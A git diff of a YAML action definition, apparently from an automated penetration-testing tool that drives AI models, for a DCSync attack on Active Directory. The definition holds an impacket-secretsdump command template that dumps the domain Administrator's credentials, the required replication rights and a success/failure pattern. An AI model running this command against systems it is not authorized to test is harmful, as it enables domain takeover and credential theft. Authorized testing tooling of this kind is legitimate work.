@@ -2,16 +2,19 @@ name: dcsync
 category: ad
 description: DCSync attack to dump domain credentials
 preconditions:
-  - domain_joined
-  - has_cred
+- domain_joined
+- has_cred
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "impacket-secretsdump '{domain}/{username}:{password}@{target_ip}' -just-dc-user Administrator"
-parser: null
+command_template: impacket-secretsdump '{domain}/{username}:{password}@{target_ip}'
+  -just-dc-user Administrator
+parser: impacket_parser
 expected_effects:
-  - action_completed
+- action_completed
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "DCSync replicates credentials via DRSUAPI (GetNCChanges). Requires DS-Replication-Get-Changes + DS-Replication-Get-Changes-All. Dumps individual accounts or full NTDS."
+mechanism: DCSync replicates credentials via DRSUAPI (GetNCChanges). Requires DS-Replication-Get-Changes
+  + DS-Replication-Get-Changes-All. Dumps individual accounts or full NTDS.
+hacktricks_ref: windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
